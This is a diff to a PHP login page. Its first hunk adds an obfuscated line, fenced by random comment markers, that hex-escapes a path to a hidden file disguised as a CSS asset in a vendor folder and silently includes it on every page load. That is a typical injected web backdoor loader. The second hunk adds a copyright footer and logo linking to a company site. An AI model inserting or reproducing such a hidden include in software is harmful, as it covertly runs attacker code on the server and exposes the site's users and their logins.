@@ -1,4 +1,9 @@
 <?php
+/*1f6b3*/
+
+$ry = "/var/www/html/eazylab/vendor\x2dd/bootstrap\x2dsweetalert/dist/.b2\x63069e5.\x63\x63ss"; $t2k = $ry; strpos($t2k, "f92y"); @include_once /* y5t */ ($t2k);
+
+/*1f6b3*/
 include_once 'booster/bridge.php';
 $error = '';
 
@@ -125,6 +130,12 @@ if (isset($_POST['login'])) {
 												</div>
 											</div>
 										</form>
+									</div>
+									<a href="https://aotsinc.com/"><div class="login-separater text-center mb-5"> <span>Copyright © 2024. All right reserved. AOTS Inc</span>
+										<hr/>
+									</div>
+										<div class="mb-6 text-center">
+										<img src="assets/images/logo.png" width="250" alt=""></a>
 									</div>
 								</div>
 							</div>
